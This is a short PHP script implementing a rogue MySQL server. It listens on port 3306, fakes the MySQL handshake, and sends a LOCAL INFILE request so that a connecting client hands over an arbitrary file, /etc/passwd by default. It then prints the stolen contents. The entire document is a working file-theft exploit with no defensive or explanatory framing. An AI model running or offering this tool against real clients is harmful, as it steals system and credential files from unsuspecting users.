<?php
function unhex($str) { return pack("H*", preg_replace('#[^a-f0-9]+#si', '', $str)); }

$filename = "/etc/passwd";

$srv = stream_socket_server("tcp://0.0.0.0:3306");

while (true) {
  echo "Enter filename to get [$filename] > ";
  $newFilename = rtrim(fgets(STDIN), "\r\n");
  if (!empty($newFilename)) {
    $filename = $newFilename;
  }

  echo "[.] Waiting for connection on 0.0.0.0:3306\n";
  $s = stream_socket_accept($srv, -1, $peer);
  echo "[+] Connection from $peer - greet... ";
  fwrite($s, unhex('5b 00 00 00 0a 35 2e 36 2e 32 38 2d 30 75 62 75
                    6e 74 75 30 2e 31 34 2e 30 34 2e 31 00 2d 00 00
                    00 40 3f 59 26 4b 2b 34 60 00 ff f7 08 02 00 7f
                    80 15 00 00 00 00 00 00 00 00 00 00 68 69 59 5f
                    52 5f 63 55 60 64 53 52 00 6d 79 73 71 6c 5f 6e
                    61 74 69 76 65 5f 70 61 73 73 77 6f 72 64 00'));
  fread($s, 8192);
  echo "auth ok... ";
  fwrite($s, unhex('07 00 00 02 00 00 00 02  00 00 00'));
  fread($s, 8192);
  echo "some shit ok... ";
  fwrite($s, unhex('05 00 00 01 fe 00 00 02 00'));
  fread($s, 8192);
  echo "want file... ";
  fwrite($s, chr(strlen($filename) + 1) . "\x00\x00\x01\xFB" . $filename);
  //fwrite($s, unhex('0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64'));
  stream_socket_shutdown($s, STREAM_SHUT_WR);
  echo "\n";

  echo "[+] $filename from $peer:\n";

  $len = fread($s, 4);
  if(!empty($len)) {
    list (, $len) = unpack("V", $len);
    $len &= 0xffffff;
    while ($len > 0) {
      $chunk = fread($s, $len);
      $len -= strlen($chunk);
      echo $chunk;
    }
  }

  echo "\n\n";
  fclose($s);
}
